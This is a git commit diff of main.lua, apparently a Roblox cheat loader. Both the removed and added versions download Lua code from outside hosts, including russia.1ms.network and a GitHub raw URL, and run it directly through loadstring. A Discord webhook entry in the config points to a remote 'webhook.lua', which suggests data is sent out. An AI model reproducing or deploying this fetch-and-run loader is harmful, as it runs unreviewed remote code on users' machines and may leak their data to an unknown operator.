8661fe1636edb639c1275137661a4afc59a50a51
Sam F <github@ipto.space>
2025-04-17 09:57:04 -0700

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,11 +1,11 @@
 --// Loader
-getgenv().Config = {
-    Webhook = "https://discord.com/api/webhooks/",
-    ScriptURL = "https://russia.1ms.network/rblx/webhook.lua",
-}
-
-if rconsoleclear then rconsoleclear() end
-
-print("Starting: Hatching Scripts")
-loadstring(game:HttpGet(getgenv().Config.ScriptURL))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MateoDev2024/MoonX/main/Loader.lua"))()
+ getgenv().Config = {
+     Webhook = "https://discord.com/api/webhooks/",
+     ScriptURL = "https://russia.1ms.network/rblx/webhook.lua",
+     AntiAFKURL = "https://russia.1ms.network/rblx/antiafk.lua"
+ }
+ 
+ print("Starting: Hatching Scripts")
+ loadstring(game:HttpGet(getgenv().Config.ScriptURL))()
+ loadstring(game:HttpGet(getgenv().Config.AntiAFKURL))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/MateoDev2024/MoonX/main/Loader.lua"))()
